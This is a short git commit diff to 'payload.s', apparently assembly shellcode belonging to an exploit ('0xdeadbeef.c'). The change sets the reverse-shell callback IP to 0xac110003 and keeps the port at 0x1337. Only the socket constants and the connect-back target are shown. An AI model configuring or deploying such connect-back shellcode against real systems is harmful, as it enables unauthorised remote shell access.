391454b0432eb6df9f98afda8b946c5b6b7068a5
royharoush <roy@haroush.net>
2017-06-15 12:26:28 +0300

    Update payload.s

--- payload.s
+++ payload.s
@@ -15,7 +15,7 @@ SYS_GETUID	equ 0x66
 AF_INET		equ 0x2
 SOCK_STREAM	equ 0x1
 
-IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
+IP		equ 0xac110003	;; patched by 0xdeadbeef.c
 PORT		equ 0x1337	;; patched by 0xdeadbeef.c
 
 _start:
